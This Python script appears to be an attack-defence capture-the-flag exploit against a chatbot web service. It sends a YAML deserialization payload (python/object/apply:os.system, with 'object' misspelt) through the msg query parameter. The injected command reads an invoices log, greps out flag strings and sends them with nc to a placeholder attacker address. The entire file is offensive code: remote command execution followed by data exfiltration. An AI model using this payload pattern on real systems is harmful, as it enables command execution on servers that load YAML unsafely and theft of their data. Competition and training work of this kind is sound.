import requests
import re
import sys

IP = sys.argv[1]
base_url = f'http://{IP}:7353/'

flag_regex = 'ENO[A-Za-z0-9+\/=]{48}'

payment_type = """
        !!map {
            ? !!str "cash"
            : !!python/objet/apply:os.system [
                !!str "cat accounting/outstanding-invoices.log | egrep -o 'ENO[A-Za-z0-9+\/=]{48}' | nc <ip> <port> -q 10"
            ],
        }
"""

def register(s):
    s.get(base_url)


def add_item(s):
    url = base_url + '/get_bot_response?msg=asd&state={"mode": "alarm", "alarm_time": "12:12"}'
    r = s.get(url)


def inject_payload(s):
    url = base_url + '/get_bot_response?msg=' + payment_type + '&state={"mode": "alarm", "payment": "pending"}'
    r = s.get(url)
    print(r.text)


def main():
    s = requests.Session()
    register(s)
    add_item(s)
    inject_payload(s)

if __name__ == '__main__':
    main()
